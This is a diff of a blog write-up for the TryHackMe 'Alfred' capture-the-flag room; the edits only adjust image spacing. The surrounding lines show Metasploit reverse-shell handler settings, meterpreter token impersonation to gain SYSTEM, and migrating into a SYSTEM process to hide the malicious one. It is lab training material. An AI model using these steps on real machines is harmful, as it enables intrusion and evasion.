@@ -269,7 +269,7 @@ msf6 set LHOST {THM IM}
 msf6 set LPORT {THE PORT DECLARED FOR EXECUTABLE BEFORE}
 msf6 run
 {% endhighlight %}
-![](/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png)
+![](/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png)<br>
 - After successfully receiving the meterpreter console, load the incognito module.
 <br>Run:
 {% highlight bash %}
@@ -289,9 +289,10 @@ impersonate_token "BUILTIN\Administrators"
 If everything were successfully done, **NT AUTHORITY\SYSTEM** should be the output of the **getuid** command.
 ![](/assets/img/posts/tryhackme-alfred-ctf-writeup/18.png)
 - Run **ps** to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.
-![](/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png)
+
+![](/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png)<br>
 By doing that, we have camouflaged our malicious process into a safer looking one.
-<br>![](/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png)
+<br>![](/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png)<br>
 <br>To get the root flag, run:
 {% highlight bash %}
 cat "C:\Windows\system32\config\root.txt"
